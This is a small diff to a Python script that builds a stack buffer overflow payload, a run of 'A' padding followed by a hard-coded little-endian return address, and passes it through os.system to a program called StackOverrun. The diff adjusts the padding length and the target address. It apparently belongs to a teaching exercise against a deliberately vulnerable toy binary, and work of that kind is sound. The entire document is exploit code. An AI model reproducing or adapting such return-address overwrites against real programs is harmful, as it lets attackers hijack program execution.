@@ -1,5 +1,6 @@
 import os
 
-arg = "AAAAAAAAAAAAAAAA" + "\xB4\x11\x40";
-cmd = "StackOverrun " + arg;
+
+arg = "AAAAAAAAAAAAAAAAAA\x21\x12\x40"
+cmd = "./StackOverrun " + arg;
 os.system(cmd)
